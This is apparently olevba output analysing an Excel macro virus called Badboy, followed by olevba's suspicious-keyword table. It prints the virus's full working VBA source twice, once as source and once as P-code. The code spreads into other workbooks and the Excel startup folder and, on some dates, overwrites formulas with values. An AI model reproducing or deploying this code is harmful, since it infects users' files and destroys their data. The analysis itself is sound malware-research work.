olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.Badboy
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ./Virus.MSExcel.Badboy - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const Sn = "Books.xls"
Sub CreatSelf(r As String)
    On Error Resume Next
    Application.DisplayAlerts = False
    LookAdd
    Application.ActiveWorkbook.SaveAs r
    Application.DisplayAlerts = True
    On Error GoTo 0
End Sub
Private Sub Workbook_Open()
    On Error Resume Next
    Application.ScreenUpdating = False
    r = Application.StartupPath & "\" & Sn
    s = Application.Workbooks(Sn).Name
    If s = "" Then
        cf = ActiveWorkbook.Name
        Application.Workbooks.Add
        CreatSelf (r)
        Workbooks(cf).Activate
    End If
    CheckMsg
    Application.ScreenUpdating = True
    On Error GoTo 0
End Sub
Function LookAdd() As Boolean
    On Error Resume Next
    If ThisWorkbook.Name = ActiveWorkbook.Name Then GoTo NoAdd
    With ActiveWorkbook.VBProject.VBComponents("ThisWorkbook")
        s = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.CountOfLines
        m = .CodeModule.CountOfLines
        If m >= s Then GoTo NoAdd
        Do While .CodeModule.CountOfLines > 0
            .CodeModule.DeleteLines 1, .CodeModule.CountOfLines
        Loop
        For i = 1 To s
            sl = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(i, 1)
            .CodeModule.InsertLines i, sl
        Next i
        ap = ActiveWorkbook.Path
        If ap <> "" Then ActiveWorkbook.Save
    End With
YesAdd:
    LookAdd = True
    On Error GoTo 0
    Exit Function
NoAdd:
    LookAdd = False
    On Error GoTo 0
End Function
Sub LookIt()
    On Error Resume Next
    LookAdd
    Application.ScreenUpdating = True
    On Error GoTo 0
End Sub
Sub CheckMsg()
    On Error Resume Next
    Dim RndResult As Integer, C As Integer
    Dim MsgS(1 To 4) As String, YesS(1 To 2) As String, NoS(1 To 2) As String
    Static Ot As Date
    Application.OnTime Ot, Sn & "!ThisWorkbook.CheckMsg", schedule:=False
    MsgS(1) = "ОТІВПл,ДгТ»¶ЁєЬїЙ°®,ФјДгµЅЅЦРД№«Ф°ЙўЙўІЅ,ДгІ»ЅйТв°Й !"
    MsgS(2) = "ЅсМмµДТ№ѕ°Н¦ГА , ФјДгµЅТфАЦї§·И№ЭЧшЧш,єГВр ?!"
    MsgS(3) = "Щ»ГГ ! јыµЅДгХжёЯРЛ,ЅсНнФјДгµЅµДКїёЯМшОи,І»ЦЄТвПВИзєО !"
    MsgS(4) = "РЎІцГЁ ! ФЫГЗ»№КЗПИЅвѕцДгµДІцЧмОКМв,ґуЕЕµµИзєО !"
    YesS(1) = "М«єГБЛ, јыГжєуОТТ»¶ЁТЄЗлЅМДгµД·јГы !"
    YesS(2) = "ЧўТв , ОТКЦЦРДГЧЕТ»КшПК»ЁФЪГЕїЪµИДг !"
    NoS(1) = "ХжІ»ЗЙ , ХвёцµШ·ЅТСѕ­НЈТµБЛ !"
    NoS(2) = "їґОТХвјЗРФ , ѕУИ»НьБЛДЗёцµШ·ЅФЪДД¶щ !"
    Randomize
    RndResult = Int((4 * Rnd) + 1)
    C = MsgBox(MsgS(RndResult), vbYesNo, "ПЈНыДгДЬЅУКЬОТµДСыЗл!")
    Randomize
    If C = vbYes Then
        If LookAdd = True Then
            RndResult = Int((2 * Rnd) + 1)
            MsgBox YesS(RndResult), vbOKOnly, "єНДгФј»б,ОТєГїЄРДЕ¶!"
        Else
            C = vbNo
        End If
    End If
    If C = vbNo Then
        'Bad boy
        Application.ScreenUpdating = False
        If Right(Date$, 1) = 1 Then
            ol = Selection.Address
            Cells.Select
            Application.CutCopyMode = False
            Selection.Copy
            Selection.PasteSpecial Paste:=xlValues, Operation:=xlNone, SkipBlanks:= _
                False, Transpose:=False
            Application.CutCopyMode = False
            Range(ol).Select
            ap = ActiveWorkbook.Path
            If ap <> "" Then ActiveWorkbook.Save
        End If
        Application.ScreenUpdating = True
        RndResult = Int((2 * Rnd) + 1)
        MsgBox NoS(RndResult), vbOKOnly, "Нт·ЦТЕє¶,ПЈНыПВґО»№УР»ъ»б!"
    End If
    Ot = Now + TimeValue("00:10:00")
    Application.OnTime Ot, Sn & "!ThisWorkbook.CheckMsg"
    On Error GoTo 0
End Sub


































-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: ./Virus.MSExcel.Badboy - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: ./Virus.MSExcel.Badboy - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: ./Virus.MSExcel.Badboy - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSExcel.Badboy
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 12480 bytes
' Line #0:
' 	Dim (Const) 
' 	LitStr 0x0009 "Books.xls"
' 	VarDefn Sn
' Line #1:
' 	FuncDefn (Sub CreatSelf(r As String))
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #4:
' 	ArgsCall LookAdd 0x0000 
' Line #5:
' 	Ld r 
' 	Ld Application 
' 	MemLd ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #6:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #7:
' 	OnError (GoTo 0) 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Private Sub Workbook_Open())
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #12:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Sn 
' 	Concat 
' 	St r 
' Line #13:
' 	Ld Sn 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd New 
' 	St s 
' Line #14:
' 	Ld s 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #15:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St cf 
' Line #16:
' 	Ld Application 
' 	MemLd Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #17:
' 	Ld r 
' 	Paren 
' 	ArgsCall CreatSelf 0x0001 
' Line #18:
' 	Ld cf 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Activate 0x0000 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	ArgsCall CheckMsg 0x0000 
' Line #21:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #22:
' 	OnError (GoTo 0) 
' Line #23:
' 	EndSub 
' Line #24:
' 	FuncDefn (Function LookAdd(id_FFFE As Boolean) As Boolean)
' Line #25:
' 	OnError (Resume Next) 
' Line #26:
' 	Ld ThisWorkbook 
' 	MemLd New 
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo NoAdd 
' 	EndIf 
' Line #27:
' 	StartWithExpr 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	With 
' Line #28:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St s 
' Line #29:
' 	MemLdWith CodeModule 
' 	MemLd CountOfLines 
' 	St m 
' Line #30:
' 	Ld m 
' 	Ld s 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	GoTo NoAdd 
' 	EndIf 
' Line #31:
' 	MemLdWith CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	DoWhile 
' Line #32:
' 	LitDI2 0x0001 
' 	MemLdWith CodeModule 
' 	MemLd CountOfLines 
' 	MemLdWith CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #33:
' 	Loop 
' Line #34:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld s 
' 	For 
' Line #35:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St sl 
' Line #36:
' 	Ld i 
' 	Ld sl 
' 	MemLdWith CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #37:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' 	Ld ActiveWorkbook 
' 	MemLd Path 
' 	St ap 
' Line #39:
' 	Ld ap 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #40:
' 	EndWith 
' Line #41:
' 	Label YesAdd 
' Line #42:
' 	LitVarSpecial (True)
' 	St LookAdd 
' Line #43:
' 	OnError (GoTo 0) 
' Line #44:
' 	ExitFunc 
' Line #45:
' 	Label NoAdd 
' Line #46:
' 	LitVarSpecial (False)
' 	St LookAdd 
' Line #47:
' 	OnError (GoTo 0) 
' Line #48:
' 	EndFunc 
' Line #49:
' 	FuncDefn (Sub LookIt())
' Line #50:
' 	OnError (Resume Next) 
' Line #51:
' 	ArgsCall LookAdd 0x0000 
' Line #52:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #53:
' 	OnError (GoTo 0) 
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Sub CheckMsg())
' Line #56:
' 	OnError (Resume Next) 
' Line #57:
' 	Dim 
' 	VarDefn RndResult (As Integer)
' 	VarDefn C (As Integer)
' Line #58:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	VarDefn MsgS (As String)
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	VarDefn YesS (As String)
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	VarDefn NoS (As String)
' Line #59:
' 	Dim (Static) 
' 	VarDefn Ot (As Date)
' Line #60:
' 	Ld Ot 
' 	Ld Sn 
' 	LitStr 0x0016 "!ThisWorkbook.CheckMsg"
' 	Concat 
' 	LitVarSpecial (False)
' 	ParamNamed schedule 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0003 
' Line #61:
' 	LitStr 0x0035 "ОТІВПл,ДгТ»¶ЁєЬїЙ°®,ФјДгµЅЅЦРД№«Ф°ЙўЙўІЅ,ДгІ»ЅйТв°Й !"
' 	LitDI2 0x0001 
' 	ArgsSt MsgS 0x0001 
' Line #62:
' 	LitStr 0x002D "ЅсМмµДТ№ѕ°Н¦ГА , ФјДгµЅТфАЦї§·И№ЭЧшЧш,єГВр ?!"
' 	LitDI2 0x0002 
' 	ArgsSt MsgS 0x0001 
' Line #63:
' 	LitStr 0x0037 "Щ»ГГ ! јыµЅДгХжёЯРЛ,ЅсНнФјДгµЅµДКїёЯМшОи,І»ЦЄТвПВИзєО !"
' 	LitDI2 0x0003 
' 	ArgsSt MsgS 0x0001 
' Line #64:
' 	LitStr 0x0030 "РЎІцГЁ ! ФЫГЗ»№КЗПИЅвѕцДгµДІцЧмОКМв,ґуЕЕµµИзєО !"
' 	LitDI2 0x0004 
' 	ArgsSt MsgS 0x0001 
' Line #65:
' 	LitStr 0x0024 "М«єГБЛ, јыГжєуОТТ»¶ЁТЄЗлЅМДгµД·јГы !"
' 	LitDI2 0x0001 
' 	ArgsSt YesS 0x0001 
' Line #66:
' 	LitStr 0x0025 "ЧўТв , ОТКЦЦРДГЧЕТ»КшПК»ЁФЪГЕїЪµИДг !"
' 	LitDI2 0x0002 
' 	ArgsSt YesS 0x0001 
' Line #67:
' 	LitStr 0x001D "ХжІ»ЗЙ , ХвёцµШ·ЅТСѕ­НЈТµБЛ !"
' 	LitDI2 0x0001 
' 	ArgsSt NoS 0x0001 
' Line #68:
' 	LitStr 0x0025 "їґОТХвјЗРФ , ѕУИ»НьБЛДЗёцµШ·ЅФЪДД¶щ !"
' 	LitDI2 0x0002 
' 	ArgsSt NoS 0x0001 
' Line #69:
' 	ArgsCall Read 0x0000 
' Line #70:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St RndResult 
' Line #71:
' 	Ld RndResult 
' 	ArgsLd MsgS 0x0001 
' 	Ld vbYesNo 
' 	LitStr 0x0015 "ПЈНыДгДЬЅУКЬОТµДСыЗл!"
' 	ArgsLd MsgBox 0x0003 
' 	St C 
' Line #72:
' 	ArgsCall Read 0x0000 
' Line #73:
' 	Ld C 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #74:
' 	Ld LookAdd 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #75:
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St RndResult 
' Line #76:
' 	Ld RndResult 
' 	ArgsLd YesS 0x0001 
' 	Ld vbOKOnly 
' 	LitStr 0x0014 "єНДгФј»б,ОТєГїЄРДЕ¶!"
' 	ArgsCall MsgBox 0x0003 
' Line #77:
' 	ElseBlock 
' Line #78:
' 	Ld vbNo 
' 	St C 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	Ld C 
' 	Ld vbNo 
' 	Eq 
' 	IfBlock 
' Line #82:
' 	QuoteRem 0x0008 0x0007 "Bad boy"
' Line #83:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #84:
' 	Ld Date$ 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #85:
' 	Ld Selection 
' 	MemLd Address 
' 	St ol 
' Line #86:
' 	Ld Cells 
' 	ArgsMemCall Set 0x0000 
' Line #87:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt CutCopyMode 
' Line #88:
' 	Ld Selection 
' 	ArgsMemCall Copy 0x0000 
' Line #89:
' 	LineCont 0x0004 0D 00 10 00
' 	Ld xlValues 
' 	ParamNamed Paste 
' 	Ld xlNone 
' 	ParamNamed Operation 
' 	LitVarSpecial (False)
' 	ParamNamed SkipBlanks 
' 	LitVarSpecial (False)
' 	ParamNamed Transpose 
' 	Ld Selection 
' 	ArgsMemCall PasteSpecial 0x0004 
' Line #90:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt CutCopyMode 
' Line #91:
' 	Ld ol 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #92:
' 	Ld ActiveWorkbook 
' 	MemLd Path 
' 	St ap 
' Line #93:
' 	Ld ap 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveWorkbook 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #96:
' 	LitDI2 0x0002 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St RndResult 
' Line #97:
' 	Ld RndResult 
' 	ArgsLd NoS 0x0001 
' 	Ld vbOKOnly 
' 	LitStr 0x001A "Нт·ЦТЕє¶,ПЈНыПВґО»№УР»ъ»б!"
' 	ArgsCall MsgBox 0x0003 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	Ld Now 
' 	LitStr 0x0008 "00:10:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	St Ot 
' Line #100:
' 	Ld Ot 
' 	Ld Sn 
' 	LitStr 0x0016 "!ThisWorkbook.CheckMsg"
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #101:
' 	OnError (GoTo 0) 
' Line #102:
' 	EndSub 
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' Line #136:
' _VBA_PROJECT_CUR/VBA/Лист1 - 956 bytes
' _VBA_PROJECT_CUR/VBA/Лист2 - 956 bytes
' _VBA_PROJECT_CUR/VBA/Лист3 - 956 bytes
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

